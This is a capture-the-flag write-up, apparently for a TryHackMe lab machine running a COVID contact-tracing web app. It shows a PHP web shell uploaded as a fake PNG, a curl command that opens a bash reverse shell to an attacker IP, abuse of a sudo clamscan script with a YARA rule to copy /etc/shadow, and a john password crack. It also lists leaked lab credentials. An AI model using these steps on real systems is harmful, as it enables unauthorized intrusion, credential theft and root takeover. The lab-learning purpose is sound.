# Export
```bash
export IP="10.10.217.17"
export URL="http://10.10.217.17/FUZZ"
```

<hr>

# Credentials
+ MySQL: `cts:YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE`
+ Web: `admin:sweetpandemonium` (Leaked from Mysql database)
+ Local user: `cyrus:sweetpandemonium`

<hr>

# RCE
+ Upload a "php" image here: 
	+ http://contacttracer.thm/admin/?page=system_info
+ Check the `Network` tab of developer tool at `/login.php` to view the image location.

```bash
curl -s http://contacttracer.thm/uploads/1633297860_test.png.php\?cmd=whoami --output -                                                                                              23 ⨯
PNG

IHDPN   pHYs

            tIME(e\tEXtCommentCreated with The GIMPd%eIDATxKL]@܌DF.F&*B1ոQ"`+BJ
www-data
```

+ Reverse shell
```bash
$ curl -s http://contacttracer.thm/uploads/1633297860_test.png.php\?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.4.1.61%2F80+0%3E%261%22

$ nc -nlvp 80                     
listening on [any] 80 ...
connect to [10.4.1.61] from (UNKNOWN) [10.10.139.26] 54572
bash: cannot set terminal process group (1046): Inappropriate ioctl for device
bash: no job control in this shell
www-data@lockdown:/var/www/html/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<hr>

# Privilege Escalation
+ Access `cyrus` with the credentials -  `cyrus:sweetpandemonium`
+ `sudo`
```bash
cyrus@lockdown:~$ sudo -l
[sudo] password for cyrus: 
Matching Defaults entries for cyrus on lockdown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on lockdown:
    (root) /opt/scan/scan.sh
```

+ `/opt/scan/scan.sh`

```bash
cyrus@lockdown:~$ cat /opt/scan/scan.sh
#!/bin/bash

read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

+ Create a `root.yara` file with the following content:

```bash
cyrus@lockdown:~$ cat /var/lib/clamav/root.yara 
rule root_txt
{
        strings:
                $a = "www-data:*:"
        condition:
                $a
}
```

+ Trigger the rules

```bash
cyrus@lockdown:~$ sudo /opt/scan/scan.sh                                                        
[sudo] password for cyrus: 
Enter path: /etc   
/etc/ld.so.cache: OK                        
/etc/manpath.config: OK
/etc/rsyslog.conf: OK
...
----------- SCAN SUMMARY -----------
Known viruses: 2
Engine version: 0.103.2
Scanned directories: 1
Scanned files: 83
Infected files: 4
Data scanned: 0.23 MB
Data read: 0.12 MB (ratio 1.97:1)
Time: 0.080 sec (0 m 0 s)
Start Date: 2021:10:04 01:04:25
End Date:   2021:10:04 01:04:25
```

+ The `/etc/shadow` file is copied to  `~/quarantine/shadow`

```bash
cyrus@lockdown:~$ cat quarantine/shadow
...
maxine:$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
...
```

+ Crack `shadow` password

```bash
$ unshadow maxine_passwd maxine_shadow > maxine_pass 
$ john --wordlist=/usr/share/wordlists/rockyou.txt maxine_pass
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tiarna           (maxine)
1g 0:00:00:17 DONE (2021-10-03 21:10) 0.05767g/s 4665p/s 4665c/s 4665C/s 070196..skyline123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
cyrus@lockdown:~$ su maxine
Password: 
maxine@lockdown:/home/cyrus$ sudo su -
root@lockdown:~# id
uid=0(root) gid=0(root) groups=0(root)
```

<hr>

# Nmap
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 27:1d:c5:8a:0b:bc:02:c0:f0:f1:f5:5a:d1:ff:a4:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA1Xdw3dCrCjetmQieza7pYcBp1ceBvVB6g1A/OU+bqoRSEfnKTHP0k5P2U1BbeciJTqflslP3IHh+py4jkWTkzbU80Mxokn2Kr5Qa5GKgrme4Q6GfQsQeeFpbLlIHs+eEBnCLY/J03iddkt6eukd3
VwZuRXHnEHl7G6Y1f0IEEzProg15iAtUTbS8OwPx+ZwdvXfJTWujUS+OzLLjQw5wPewCEK+TJHVM02H+5sO+dYBMC9rgiEnPe5ayP+nupAXMNYB9/p/gO3nj5h33SokY3RkXMFsijUJpoBnsDHNgo2Q41j9AB4txabzUQVFql30WO8l8azO4y/fWYYtU8Y
Cn                                   
|   256 ce:f7:60:29:52:4f:65:b1:20:02:0a:2d:07:40:fd:bf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGjTYytQsU83icaN6V9H1Kotl0nKVpR35o6PtyrWy9WjljhWaNr3cnGDUnd7RSIUOiZco3UL5+YC31sBdVy6b6o=
|   256 a5:b5:5a:40:13:b0:0f:b6:5a:5f:21:60:71:6f:45:2e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHVz0M8zYIXcw2caiAlNCr01ycEatz/QPx1PpgMZqZN
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:                 
|   /:                                      
|     PHPSESSID:                                                                                                                                                                              
|_      httponly flag not set                                                                  
| http-methods:                                                                                
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Coronavirus Contact Tracer
```

<hr>

# Web Application
+ Domain: `contacttracer.thm`
+ Directory

```bash
admin                   [Status: 301, Size: 322, Words: 20, Lines: 10]
build                   [Status: 301, Size: 322, Words: 20, Lines: 10]
classes                 [Status: 301, Size: 324, Words: 20, Lines: 10]
dist                    [Status: 301, Size: 321, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 17762, Words: 3840, Lines: 397]
libs                    [Status: 301, Size: 321, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 324, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 282, Words: 20, Lines: 10]
temp                    [Status: 301, Size: 321, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 324, Words: 20, Lines: 10]
```

+ `/admin/login.php` is vulnerable to SQL injection.
	+ https://packetstormsecurity.com/files/164005/COVID-19-Contact-Tracing-System-With-QR-Code-Scanning-1.0-SQL-Injection.html

+ Upload a "php" image here: http://contacttracer.thm/admin/?page=system_info/ → RCE
